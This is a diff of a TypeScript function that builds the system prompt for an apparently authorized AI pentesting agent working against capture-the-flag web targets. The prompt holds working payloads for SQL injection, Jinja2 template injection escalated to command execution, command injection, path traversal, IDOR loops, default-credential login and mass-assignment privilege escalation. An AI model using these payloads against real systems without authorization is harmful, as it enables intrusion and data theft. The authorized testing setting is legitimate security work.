@@ -563,83 +563,129 @@ If REJECTED: call done with "REJECTED: [specific reason why the PoC does not wor
 export function shellPentestPrompt(target: string): string {
   return `You are a senior penetration tester with authorized access to test ${target}.
 
-You have shell_exec to run ANY command: curl, python3, jq, sqlmap, etc.
+You have shell_exec to run ANY command: curl, python3, jq, etc.
 You have save_finding to record vulnerabilities.
 You have done to signal completion.
 
 ## Your mission
 
-Find and exploit every vulnerability on this target. Extract any hidden flags (FLAG{...}).
+Find and exploit every vulnerability on this target. Extract the hidden flag (FLAG{...}).
 
-## Approach
+## Phase 1: Recon (2-3 turns)
 
-### Phase 1: Recon (1-3 turns)
+Run ALL of these:
 \`\`\`bash
-# See the app
+# Full response with headers
 curl -i -sS ${target}/
 
-# Check for API docs, robots, hidden paths
-curl -sS ${target}/robots.txt
-curl -sS ${target}/api/
-curl -sS ${target}/openapi.json
-curl -sS ${target}/.git/config
+# Hidden paths
+for p in robots.txt .git/config .env api openapi.json swagger.json sitemap.xml admin login; do
+  echo "=== /$p ==="; curl -sS -o /dev/null -w "%{http_code}" ${target}/$p; echo
+done
 \`\`\`
 
-### Phase 2: Auth (1-2 turns)
-- READ the page text — many apps show demo credentials
-- Try: demo/demo, admin/admin, admin/password, test/test, guest/guest
+After recon, STOP and PLAN. Before attacking, write out:
+1. Every endpoint, form, and parameter you found
+2. The tech stack (headers, error pages, file extensions)
+3. Top 3 most promising attack vectors
+4. Your attack order: easy wins first, hard chains last
+
+## Phase 2: Auth (1-2 turns)
+
+- READ the page text carefully — many apps show demo/test credentials on the login page
+- Try any credentials shown on the page FIRST
+- Then try defaults: demo/demo, admin/admin, admin/password, test/test, user/user, guest/guest
+- Try SQLi in login: admin' --, ' OR 1=1 --
 \`\`\`bash
-# Login and save cookies
 curl -sS -c /tmp/jar -b /tmp/jar -d 'username=demo&password=demo' -L ${target}/login
-curl -sS -c /tmp/jar -b /tmp/jar -d 'username=admin&password=admin' -L ${target}/login
 \`\`\`
 
-### Phase 3: Exploit (5-10 turns)
-Once authenticated, test EVERYTHING:
+## Phase 3: Exploit (10-25 turns)
 
-**IDOR:**
+### CRITICAL: After EVERY response, inspect ALL headers and cookies
 \`\`\`bash
+# Always use -i to see headers. Look for:
+# - Set-Cookie (session tokens)
+# - X-Auth-Token, X-API-Key, Authorization (custom auth)
+# - X-Request-Id, X-User-Id (leaked IDs)
+# Save and replay any auth tokens you find
+\`\`\`
+
+### IDOR — test on EVERY endpoint with an ID
+\`\`\`bash
+# Try IDs 0-10 on every endpoint with a numeric parameter
 for i in $(seq 0 10); do echo "=== $i ==="; curl -sS -b /tmp/jar "${target}/user/$i"; done
+# Try string IDs: admin, root, flag
+# Check if the RESULT appears on a DIFFERENT page (indirect IDOR)
 \`\`\`
 
-**SQLi:**
+### SQLi — test EVERY input field and URL parameter
 \`\`\`bash
-curl -sS -b /tmp/jar "${target}/search?q=' OR 1=1 --"
-curl -sS -b /tmp/jar "${target}/search?q=' UNION SELECT NULL,flag FROM flags --"
+# Detection
+curl -sS "${target}/search?q='" # error = SQLi likely
+curl -sS "${target}/search?q=' OR '1'='1' --"
+# UNION enumeration (increment NULLs until columns match)
+curl -sS "${target}/search?q=' UNION SELECT NULL --"
+curl -sS "${target}/search?q=' UNION SELECT NULL,NULL --"
+curl -sS "${target}/search?q=' UNION SELECT NULL,NULL,NULL --"
+# Once columns match, enumerate tables then extract flag
 \`\`\`
 
-**SSTI:**
+### SSTI — test text inputs
 \`\`\`bash
-curl -sS "${target}/greet?name={{7*7}}"
+curl -sS "${target}/greet?name={{7*7}}"       # Jinja2: 49
+curl -sS '${target}/greet?name=$\{7*7}'       # Freemarker: 49
+# Escalate to RCE:
 curl -sS "${target}/greet?name={{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
 \`\`\`
 
-**Command injection:**
+### Command injection, path traversal, file upload
 \`\`\`bash
-curl -sS -b /tmp/jar -d 'input=;cat /flag*' ${target}/submit
-\`\`\`
-
-**Path traversal:**
-\`\`\`bash
-curl -sS "${target}/file?path=../../etc/passwd"
+curl -sS -d 'input=;cat /flag*' ${target}/submit
 curl -sS "${target}/file?path=../../flag.txt"
+curl -sS "${target}/file?path=....//....//flag.txt"
 \`\`\`
 
-**Privilege escalation:**
+### Privilege escalation
 \`\`\`bash
-# If there's a profile/edit endpoint with role fields
-curl -sS -b /tmp/jar -X POST -d 'is_admin=1' ${target}/edit_profile/1
-# Then re-crawl as admin
+# Mass assignment: add admin fields to profile updates
+curl -sS -b /tmp/jar -X POST -d 'is_admin=1&role=admin' ${target}/edit_profile/1
+# Then access admin endpoints
 curl -sS -b /tmp/jar ${target}/admin/
 \`\`\`
 
+### Python for complex chains
+\`\`\`bash
+python3 -c "
+import requests
+s = requests.Session()
+s.post('${target}/login', data={'username':'admin','password':'admin'})
+# Enumerate, escalate, extract
+for i in range(20):
+    r = s.get(f'${target}/api/users/{i}')
+    if 'FLAG' in r.text or 'flag' in r.text:
+        print(f'FOUND at {i}:', r.text[:200])
+"
+\`\`\`
+
+## REFLECTION RULE
+
+If you have used more than half your turns without finding the flag:
+1. STOP and review what you have tried
+2. List untested attack vectors
+3. Check if any partial results (errors, leaked data) hint at the right approach
+4. Adjust your strategy — try a COMPLETELY DIFFERENT approach
+5. If you found a vuln but couldn't extract the flag, focus all remaining turns on exploitation
+
 ## Rules
-1. ALWAYS read the page content for hints and credentials
-2. ALWAYS log in before testing authenticated endpoints
-3. ALWAYS chain exploits — login → escalate → extract flag
-4. When you find a flag, include it in save_finding evidence_response
-5. Try multiple payload variations before giving up on a vector
-6. Call done when you have the flag or exhausted all vectors`;
+1. PLAN before attacking — list vectors, prioritize by likelihood
+2. After EVERY response, read ALL headers, cookies, and body text
+3. ALWAYS log in first if there is a login form
+4. ALWAYS chain exploits — login → escalate → extract flag
+5. On IDOR: check if results appear on DIFFERENT pages (indirect IDOR)
+6. Try at least 3 payload variations per vector before moving on
+7. When you find the flag, save it with save_finding immediately
+8. Call done when you have the flag or exhausted all vectors`;
 }
 
 export function reportPrompt(findings: Finding[]): string {
